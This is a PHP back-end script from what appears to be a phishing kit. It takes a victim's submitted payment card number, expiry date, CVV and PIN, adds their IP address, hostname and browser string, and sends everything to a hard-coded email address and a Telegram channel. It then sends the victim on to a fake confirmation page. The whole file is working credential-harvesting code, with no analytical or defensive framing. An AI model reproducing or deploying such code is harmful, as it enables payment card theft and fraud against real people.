<?php
include_once 'functions.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "===========================INFORMATIONS CONFIRMATION===========================\n";
$message .= "Numero C             : ".$_POST['TarjetaInput']."\n";
$message .= "Date              : ".$_POST['datem']." - ".$_POST['datan']." \n";
$message .= "Crypt              : ".$_POST['CryptInput']."\n";
$message .= "PIN              : ".$_POST['PIN']."\n";
$message .= "===========================INFOS OF MACHINE===========================\n";
$message .= "Ip              : $ip\n";
$message .= "Host               : $hostname\n";
$message .= "BROWSER     : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "===========================KA7iYAWDAN===========================\n";
$send = "roxxordeath00@outlook.fr";
$subject = "TRAJITA | $ip ";
$headers = "From:IDENTIFIANTE <anas.loigin@gmail.com>";
mail($send,$subject,$message,$headers);
$file = fopen('', 'a');
fwrite($file,$message);
telegram_send(urlencode($message));
header("Location: confirmacionMovil.html");

?>